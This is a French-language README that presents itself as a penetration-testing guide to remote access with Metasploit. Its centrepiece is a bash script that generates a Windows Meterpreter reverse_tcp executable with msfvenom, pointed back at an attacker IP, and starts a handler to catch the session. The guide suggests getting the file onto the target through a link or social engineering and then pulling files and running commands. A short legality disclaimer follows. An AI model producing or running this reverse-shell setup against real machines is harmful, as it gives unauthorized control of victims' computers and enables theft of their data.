# Investigation de Remote Access avec Metasploit

Ce dépôt, proposé par le promoteur de **Sodium**, explique en détail comment utiliser Metasploit pour simuler et analyser un accès distant (remote access) sur un appareil cible via un lien ou une application.

---

## 1. Présentation de Metasploit

**Metasploit Framework** est un outil open-source incontournable en cybersécurité, utilisé pour effectuer des tests d’intrusion, développer et exécuter des exploits, et simuler des attaques contre des systèmes informatiques.  
Il permet d’automatiser des attaques, de générer des payloads (codes malveillants), et de piloter des sessions d’accès distant.

---

## 2. Principe du Remote Access avec Metasploit

Le “remote access” consiste à prendre le contrôle d’un appareil distant (PC, smartphone, serveur) via une connexion réseau, souvent en exploitant une vulnérabilité ou en incitant la victime à exécuter un programme/piège (payload).  
Metasploit permet de :

- Générer un payload (ex : reverse shell)
- Héberger un listener pour recevoir la connexion de la victime
- Exploiter des failles connues sur des applications ou des OS
- Prendre la main sur la machine cible pour l’investigation

---

## 3. Cas d’utilisation typique

1. **Création d’un payload** : Générer un fichier exécutable ou un lien qui, une fois ouvert sur la cible, permet au testeur d’obtenir un accès.
2. **Mise en place d’un handler** : Ecouter sur un port en attendant la connexion du payload.
3. **Action sur la cible** : Une fois la connexion établie, réaliser l’analyse, l’audit ou la récupération d’informations.

---

## 4. Exemple de Script d’Automatisation

Le script ci-dessous illustre :

- La génération d’un payload “reverse shell” Windows via Metasploit
- La mise en place d’un listener
- L’explication étape par étape de chaque commande

---

```bash name=metasploit_remote_access.sh
#!/bin/bash

# Investigation de remote access avec Metasploit
# Proposé par le promoteur de Sodium

# 1. Paramètres à adapter
LHOST="IP_ATTAQUANT"     # Adresse IP de l'attaquant (ton PC)
LPORT=4444               # Port d'écoute
PAYLOAD_PATH="payload.exe"

echo "[1] Génération du payload Windows reverse shell avec msfvenom..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD_PATH

echo "[2] Payload généré : $PAYLOAD_PATH"
echo "Ce fichier doit être exécuté sur la machine cible (via un lien, une application, ou ingénierie sociale)."

echo "[3] Lancement du handler Metasploit pour attendre la connexion..."
msfconsole -q -x "use exploit/multi/handler;
set PAYLOAD windows/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
exploit" 

echo "[4] Quand le payload est exécuté sur la cible, une session Meterpreter s'ouvre."
echo "Tu peux alors investiguer le système distant (récupérer des fichiers, exécuter des commandes, etc.)."
```

---

## 5. Explications détaillées

- **msfvenom** : Génère le “payload” (le programme à exécuter sur la cible). Ici, on utilise `windows/meterpreter/reverse_tcp` pour obtenir un shell interactif.
- **LHOST & LPORT** : Spécifient où la cible doit se connecter (IP et port de l’attaquant).
- **msfconsole + exploit/multi/handler** : Démarre Metasploit en mode écoute. Dès que la cible exécute le payload, la connexion s’établit automatiquement.
- **Meterpreter** : Interface avancée permettant de contrôler la machine distante (exploration, capture d’écran, récupération de fichiers, etc.).

---

## 6. Sécurité & Légalité

⚠️ **Ce script et ces techniques sont à utiliser uniquement en environnement légal, sur des machines de test ou avec l’accord explicite du propriétaire. Toute utilisation non autorisée est interdite et illégale.**

---

## 7. Pour aller plus loin

- Tester d’autres payloads (Linux, Android, MacOS)
- Utiliser des modules d’exploit pour cibler des failles spécifiques
- Automatiser la post-exploitation (récupération automatique de preuves, mapping réseau…)

---

## Auteur

Cette investigation est réalisée par le promoteur de Sodium, spécialiste en cybersécurité et audit technique.
